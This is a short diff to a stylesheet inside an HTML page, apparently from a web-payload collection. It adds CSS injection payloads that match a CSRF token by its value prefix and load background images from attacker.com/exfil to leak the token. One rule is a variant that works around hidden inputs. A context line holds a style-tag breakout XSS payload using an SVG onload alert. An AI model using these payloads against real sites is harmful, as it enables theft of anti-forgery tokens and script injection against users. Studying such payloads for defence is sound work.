@@ -466,6 +466,17 @@ div  {
     background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
     background-color: #cccccc;
 }
+
+/* Using CSS attribute selection */
+input[name=csrf][value^=a]{
+    background-image: url(https://attacker.com/exfil/a);
+}
+
+/* Bypass for Hidden Elements */
+/* Because hidden elements do not load backgrounds */
+input[name=csrf][value^=csrF] ~ * {
+    background-image: url(https://attacker.com/exfil/csrF);
+}
 </style>
 </head>
   <body>
